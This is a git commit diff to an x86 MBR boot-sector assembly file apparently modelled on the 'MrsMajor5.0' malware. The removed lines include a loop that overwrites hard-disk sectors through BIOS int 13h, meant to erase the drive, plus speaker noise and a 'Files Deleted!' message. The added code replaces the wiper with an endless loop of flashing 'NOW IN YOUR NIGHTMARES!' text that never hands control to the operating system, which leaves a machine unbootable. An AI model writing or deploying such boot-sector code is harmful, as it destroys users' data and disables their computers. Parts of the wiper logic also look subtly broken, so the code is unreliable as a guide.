f0af49b68a6b34baf30fa87f908e6ae6fc73569b
HydraDragonAntivirus <142328963+HydraDragonAntivirus@users.noreply.github.com>
2024-09-12 12:40:26 +0300

    Some interesting effects

--- Assembly/mrsmajor5mbr.asm
+++ Assembly/mrsmajor5mbr.asm
@@ -4,32 +4,102 @@ ORG 0x7C00
 start:
     ; Boot drive is set to the first hard disk
     mov dl, 0x80            ; Set boot drive to the first hard disk (0x80)
-    
-    ; Play some scary sounds before deletion and message display
-    call scary_sounds
 
-    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" message with delay
-    call display_mrsmajor_message
+    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" message with effects
+    mov ah, 0x0E            ; Teletype output function (int 10h)
 
-    ; Begin deleting the C:\ drive (starting from sector 2)
-    mov cx, 0x02            ; Start at sector 2 (sector 1 is the boot sector)
-    mov dh, 0x00            ; Head 0
-    mov ch, 0x00            ; Cylinder 0
-    mov bx, 0x0000          ; Clear BX for zeroing out memory
-    mov es, bx              ; Set ES to 0x0000
+    ; Loop to create visual effects
+effect_loop:
+    ; Display "MrsMajor5.0" with changing colors
+    mov al, 'M'
+    mov bl, 0x0C            ; Red color
+    int 0x10
+    mov al, 'r'
+    int 0x10
+    mov al, 's'
+    int 0x10
+    mov al, 'M'
+    int 0x10
+    mov al, 'a'
+    int 0x10
+    mov al, 'j'
+    int 0x10
+    mov al, 'o'
+    int 0x10
+    mov al, 'r'
+    int 0x10
+    mov al, '5'
+    int 0x10
+    mov al, '.'
+    int 0x10
+    mov al, '0'
+    int 0x10
 
-delete_loop:
-    mov ah, 0x03            ; BIOS disk write function (int 13h)
-    xor al, al              ; Set AL to 0 to write 0 bytes (effectively erasing)
-    mov al, 1               ; Number of sectors to write
-    int 0x13                ; Interrupt call to erase sector
-    jc boot_fail            ; If write fails, show an error message
-    inc cx                  ; Move to the next sector
-    cmp cx, 0xFFFF          ; Continue until we erase many sectors
-    jne delete_loop
+    ; Brief delay to simulate effect
+    call short_delay
 
-    ; Display "Files Deleted!" message
-    call display_files_deleted_message
+    ; Change color and display "NOW IN YOUR NIGHTMARES!"
+    mov bl, 0x1F            ; White on blue color
+    mov al, 'N'
+    int 0x10
+    mov al, 'O'
+    int 0x10
+    mov al, 'W'
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 'I'
+    int 0x10
+    mov al, 'N'
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 'Y'
+    int 0x10
+    mov al, 'O'
+    int 0x10
+    mov al, 'U'
+    int 0x10
+    mov al, 'R'
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 'N'
+    int 0x10
+    mov al, 'I'
+    int 0x10
+    mov al, 'G'
+    int 0x10
+    mov al, 'H'
+    int 0x10
+    mov al, 'T'
+    int 0x10
+    mov al, 'M'
+    int 0x10
+    mov al, 'A'
+    int 0x10
+    mov al, 'R'
+    int 0x10
+    mov al, 'E'
+    int 0x10
+    mov al, 'S'
+    int 0x10
+    mov al, '!'
+    int 0x10
+
+    ; Brief delay to simulate effect
+    call short_delay
+
+    ; Repeat effects
+    jmp effect_loop
+
+short_delay:
+    ; Simple delay loop for simulating effects
+    mov cx, 0xFFFF
+delay_loop:
+    dec cx
+    jnz delay_loop
+    ret
 
     ; Chain-load the OS bootloader from the first partition
     mov dl, 0x80            ; Set the boot drive to the first hard disk
@@ -48,220 +118,28 @@ delete_loop:
 boot_fail:
     ; If the bootloader read fails, show an error message
     mov al, 'B'
-    call print_char
+    int 0x10
     mov al, 'o'
-    call print_char
+    int 0x10
     mov al, 'o'
-    call print_char
+    int 0x10
     mov al, 't'
-    call print_char
+    int 0x10
     mov al, ' '
-    call print_char
+    int 0x10
     mov al, 'f'
-    call print_char
+    int 0x10
     mov al, 'a'
-    call print_char
+    int 0x10
     mov al, 'i'
-    call print_char
+    int 0x10
     mov al, 'l'
-    call print_char
+    int 0x10
     mov al, 'e'
-    call print_char
+    int 0x10
     mov al, 'd'
-    call print_char
+    int 0x10
     jmp $
-
-scary_sounds:
-    ; Generate low-pitched scary sound
-    mov al, 0xB6            ; Set up the system speaker (control byte for PIT channel 2)
-    out 0x43, al
-    mov ax, 0x0E00          ; Low frequency tone (value in AX determines frequency)
-    out 0x42, al            ; Send low byte to channel 2
-    mov al, ah
-    out 0x42, al            ; Send high byte
-    in al, 0x61             ; Read system speaker control
-    or al, 3                ; Turn on speaker
-    out 0x61, al            ; Activate speaker
-    call delay              ; Delay for a bit to hold the sound
-    and al, 0xFC            ; Turn off speaker
-    out 0x61, al
-
-    ; Generate high-pitched scary sound
-    mov al, 0xB6            ; Set up system speaker again
-    out 0x43, al
-    mov ax, 0x0200          ; High frequency tone
-    out 0x42, al            ; Send low byte to channel 2
-    mov al, ah
-    out 0x42, al            ; Send high byte
-    in al, 0x61             ; Read system speaker control
-    or al, 3                ; Turn on speaker
-    out 0x61, al            ; Activate speaker
-    call delay              ; Delay for a bit
-    and al, 0xFC            ; Turn off speaker
-    out 0x61, al
-
-    ; Generate additional scary sounds
-    ; Low-pitched sound
-    mov al, 0xB6
-    out 0x43, al
-    mov ax, 0x0F00
-    out 0x42, al
-    mov al, ah
-    out 0x42, al
-    in al, 0x61
-    or al, 3
-    out 0x61, al
-    call delay
-    and al, 0xFC
-    out 0x61, al
-
-    ; High-pitched sound
-    mov al, 0xB6
-    out 0x43, al
-    mov ax, 0x0300
-    out 0x42, al
-    mov al, ah
-    out 0x42, al
-    in al, 0x61
-    or al, 3
-    out 0x61, al
-    call delay
-    and al, 0xFC
-    out 0x61, al
-
-    ret
-
-delay:
-    ; Simple delay loop for holding sound or message
-    mov cx, 0xFFFF
-delay_loop:
-    dec cx
-    jnz delay_loop
-    ret
-
-print_char:
-    mov ah, 0x0E           ; Function to print a character
-    int 0x10               ; BIOS interrupt 0x10
-    ret
-
-display_mrsmajor_message:
-    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" message with delay
-    mov ah, 0x0E
-    mov bl, 0x0C
-    mov al, 'M'
-    call print_char
-    mov al, 'r'
-    call print_char
-    mov al, 's'
-    call print_char
-    mov al, 'M'
-    call print_char
-    mov al, 'a'
-    call print_char
-    mov al, 'j'
-    call print_char
-    mov al, 'o'
-    call print_char
-    mov al, 'r'
-    call print_char
-    mov al, '5'
-    call print_char
-    mov al, '.'
-    call print_char
-    mov al, '0'
-    call print_char
-    mov al, ' '
-    call print_char
-    mov al, 'N'
-    call print_char
-    mov al, 'O'
-    call print_char
-    mov al, 'W'
-    call print_char
-    mov al, ' '
-    call print_char
-    mov al, 'I'
-    call print_char
-    mov al, 'N'
-    call print_char
-    mov al, ' '
-    call print_char
-    mov al, 'Y'
-    call print_char
-    mov al, 'O'
-    call print_char
-    mov al, 'U'
-    call print_char
-    mov al, 'R'
-    call print_char
-    mov al, ' '
-    call print_char
-    mov al, 'N'
-    call print_char
-    mov al, 'I'
-    call print_char
-    mov al, 'G'
-    call print_char
-    mov al, 'H'
-    call print_char
-    mov al, 'T'
-    call print_char
-    mov al, 'M'
-    call print_char
-    mov al, 'A'
-    call print_char
-    mov al, 'R'
-    call print_char
-    mov al, 'E'
-    call print_char
-    mov al, 'S'
-    call print_char
-    mov al, '!'
-    call print_char
-
-    ; Add a delay after displaying the "MrsMajor5.0" message
-    call delay
-
-    ret
-
-display_files_deleted_message:
-    ; Display "Files Deleted!" message immediately
-    mov ah, 0x0E
-    mov bl, 0x0C
-    mov al, 'F'
-    call print_char
-    mov al, 'i'
-    call print_char
-    mov al, 'l'
-    call print_char
-    mov al, 'e'
-    call print_char
-    mov al, 's'
-    call print_char
-    mov al, ' '
-    call print_char
-    mov al, 'D'
-    call print_char
-    mov al, 'e'
-    call print_char
-    mov al, 'l'
-    call print_char
-    mov al, 'e'
-    call print_char
-    mov al, 't'
-    call print_char
-    mov al, 'e'
-    call print_char
-    mov al, 'd'
-    call print_char
-    mov al, '!'
-    call print_char
-    mov al, '!'
-    call print_char
-    mov al, '!'
-    call print_char
-
-    ret
 
 times 510-($-$$) db 0       ; Fill the remaining space up to 510 bytes
 dw 0xAA55                   ; MBR signature (boot indicator)
